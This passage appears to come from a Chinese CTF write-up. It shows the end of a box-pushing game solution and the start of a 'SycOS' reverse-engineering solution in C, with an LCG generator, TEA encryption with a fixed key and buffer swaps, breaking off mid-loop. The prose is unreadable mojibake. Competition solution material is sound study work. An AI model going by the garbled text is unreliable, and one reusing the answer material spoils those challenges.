æœåˆ°æ¨ç®±å­æ“ä½œçš„åæ–¹å‘ï¼Œç„¶åæ¨ç®±å­ã€‚é‡å¤è¿™ä¸ªè¿‡ç¨‹ç›´åˆ°ç®±å­è¢«æ¨åˆ°ç»ˆç‚¹ï¼Œç„¶åå°†ç®±å­çš„ä½ç½®è®¾æˆä¸èƒ½èµ°ï¼Œä¿è¯ä»¥åä¸ä¼šä¸å°å¿ƒç¢°åˆ°ç®±å­ã€‚æœ€åé‡å¤æ•´ä¸ªè¿‡ç¨‹ç›´åˆ°æ‰€æœ‰ç®±å­è¢«æ¨åˆ°ç»ˆç‚¹ã€‚</p><p>ç¨‹åºç”Ÿæˆçš„åœ°å›¾ä¸ä¿è¯æœ‰è§£ï¼ŒåŒ…æ‹¬æˆ‘ä»¬çš„ç®—æ³•ä¹Ÿå¤„ç†ä¸äº†ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œæ‰€ä»¥æœ‰æ—¶å€™æœä¸å‡ºæ¥è§£ã€‚è¿˜æœ‰ä¸€äº›ç¨‹åºæœ¬èº«çš„ bugï¼Œæ¯”å¦‚ä¸èƒ½èµ°åˆ° -3 æˆ–è€… -2 çš„ä¸Šé¢ï¼Œå¯¼è‡´ç®—æ³•æœ‰æ—¶å€™ä¼šä¸ç¨‹åºçš„æ¨¡æ‹Ÿä¸ä¸€è‡´ã€‚ä¸è¿‡åªè¦æˆ‘ä»¬æœ‰è·èƒœçš„æ¦‚ç‡ï¼Œæˆ‘ä»¬å¯ä»¥é‡å¤æ¸¸ç©ï¼Œç›´åˆ°è¿ç»­äº”æ¬¡èƒœåˆ©ã€‚è¿™ä¸ªæ¦‚ç‡ä¸ç®—å¤ªé«˜ï¼Œä¸è¿‡ç©å¤§æ¦‚ 200 ç›˜å·¦å³å°±æœ‰ä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¤±è´¥é‡å¼€ï¼Œæœ€åæˆåŠŸæ‹¿åˆ° flagã€‚</p><h3 id=sycos><strong>SycOS</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#include&lt;stdlib.h&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;  </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdint.h&gt;  </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uint64_t</span> <span class=n>d_2ec8</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>d_2ed8</span><span class=p>[</span><span class=mh>0x80</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>d_2ed0</span><span class=p>[</span><span class=mh>0x80</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>fakerandom</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>d_2ec8</span> <span class=o>=</span> <span class=n>d_2ec8</span> <span class=o>*</span> <span class=mh>0x41c64e6d</span> <span class=o>+</span> <span class=mh>0x3039</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>//</span><span class=n>printf</span><span class=p>(</span><span class=s2>&#34;d_2ec8 = 0x%llx</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>d_2ec8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>uint8_t</span><span class=p>)((</span><span class=n>d_2ec8</span> <span class=o>&lt;&lt;</span> <span class=mh>0x21</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mh>0x31</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span> <span class=n>v</span><span class=p>,</span> <span class=n>uint32_t</span><span class=o>*</span> <span class=n>k</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint32_t</span> <span class=n>v0</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>v1</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>sum</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>i</span><span class=p>;</span>           <span class=o>/*</span> <span class=n>set</span> <span class=n>up</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint32_t</span> <span class=n>delta</span> <span class=o>=</span> <span class=mh>0x9e3779b9</span><span class=p>;</span>                     <span class=o>/*</span> <span class=n>a</span> <span class=n>key</span> <span class=n>schedule</span> <span class=n>constant</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint32_t</span> <span class=n>k0</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>k1</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k2</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k3</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>   <span class=o>/*</span> <span class=n>cache</span> <span class=n>key</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>                       <span class=o>/*</span> <span class=n>basic</span> <span class=n>cycle</span> <span class=n>start</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>sum</span> <span class=o>+=</span> <span class=n>delta</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v0</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k0</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>v1</span> <span class=o>+</span> <span class=n>sum</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v1</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v1</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v0</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k2</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>v0</span> <span class=o>+</span> <span class=n>sum</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v0</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>                                              <span class=o>/*</span> <span class=n>end</span> <span class=n>cycle</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>v0</span><span class=p>;</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span><span class=err>è§£å¯†å‡½æ•°</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>encrypt1</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span> <span class=n>v</span><span class=p>,</span> <span class=n>uint32_t</span><span class=o>*</span> <span class=n>k</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint32_t</span> <span class=n>v0</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>v1</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>sum</span> <span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>i</span><span class=p>;</span>  <span class=o>/*</span> <span class=n>set</span> <span class=n>up</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint32_t</span> <span class=n>delta</span> <span class=o>=</span> <span class=mh>0x9e3779b9</span><span class=p>;</span>                     <span class=o>/*</span> <span class=n>a</span> <span class=n>key</span> <span class=n>schedule</span> <span class=n>constant</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint32_t</span> <span class=n>k0</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>k1</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k2</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k3</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>   <span class=o>/*</span> <span class=n>cache</span> <span class=n>key</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>                         <span class=o>/*</span> <span class=n>basic</span> <span class=n>cycle</span> <span class=n>start</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v1</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v0</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k2</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>v0</span> <span class=o>+</span> <span class=n>sum</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v0</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v0</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k0</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>v1</span> <span class=o>+</span> <span class=n>sum</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v1</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>sum</span> <span class=o>+=</span> <span class=n>delta</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>                                              <span class=o>/*</span> <span class=n>end</span> <span class=n>cycle</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>v0</span><span class=p>;</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>exchange</span><span class=p>(</span><span class=ne>int</span> <span class=n>index</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint8_t</span> <span class=n>tmp</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x100</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>d_2ed8</span><span class=p>[</span><span class=mh>0x100</span> <span class=o>*</span> <span class=n>index</span> <span class=o>+</span> <span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>d_2ed8</span><span class=p>[</span><span class=mh>0x100</span> <span class=o>*</span> <span class=n>index</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>d_2ed0</span><span class=p>[</span><span class=mh>0x100</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0xf</span><span class=o>-</span><span class=n>index</span><span class=p>)</span> <span class=o>+</span> <span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>d_2ed0</span><span class=p>[</span><span class=mh>0x100</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0xf</span> <span class=o>-</span> <span class=n>index</span><span class=p>)</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>bigexchange</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>uint8_t</span> <span class=n>tmp</span><span class=p>[</span><span class=mh>0x80</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x80</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>tmp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>d_2ed8</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>d_2ed8</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>d_2ed0</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>d_2ed0</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=ne>int</span> <span class=n>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>unsigned</span> <span class=n>char</span> <span class=n>input</span><span class=p>[</span><span class=mh>0x41</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=n>var3</span> <span class=o>=</span> <span class=mh>0x80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=n>var1</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=n>var5</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>d_2ec8</span> <span class=o>=</span> <span class=n>input</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mh>0x80</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>uint8_t</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>fakerandom</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>d_2ed8</span><span class=p>[</span><span class=mh>0x80</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x20</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>d_2ec8</span> <span class=o>=</span> <span class=n>input</span><span class=p>[</span><span class=mh>0x20</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mh>0x80</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>uint8_t</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>fakerandom</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=n>d_2ed0</span><span class=p>[</span><span class=mh>0x80</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=ne>int</span> <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span> <span class=p>;</span> <span class=n>index</span> <span class=o>&lt;</span> <span class=mh>0x10</span> <span class=p>;</span> <span class=o>++</span><span class=n>index</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x1000</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>uint32_t</span> <span class=n>v</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>uint32_t</span>  <span class=n>key</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x11222233</span> <span class=p>,</span><span class=mh>0xAABBCCDD</span><span class=p>,</span> <span class=mh>0x1a2b3c4d</span><span class=p>,</span><span class=mh>0xcc1122aa</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed8</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed8</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>encrypt</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>//</span>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;v0 == </span><span class=si>%lx</span><span class=s2> v1== </span><span class=si>%lx</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
